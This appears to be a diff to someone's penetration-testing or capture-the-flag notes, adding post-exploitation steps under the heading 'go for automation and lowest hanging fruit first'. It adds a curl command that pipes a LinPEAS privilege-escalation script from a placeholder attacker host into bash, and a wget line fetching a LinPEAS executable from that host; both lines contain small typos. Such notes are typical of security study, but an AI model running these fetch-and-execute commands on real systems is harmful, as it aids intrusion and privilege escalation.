@@ -1,6 +1,10 @@
 GO FOR AUTOMATION AND LOWEST HANGING FRUIT FIRST
 
+curl -L http:/<myip>/linpeas.sh | bash
 
+OR
+
+wget http://<myip>/linpeas.exe pee.exe
 
 
 
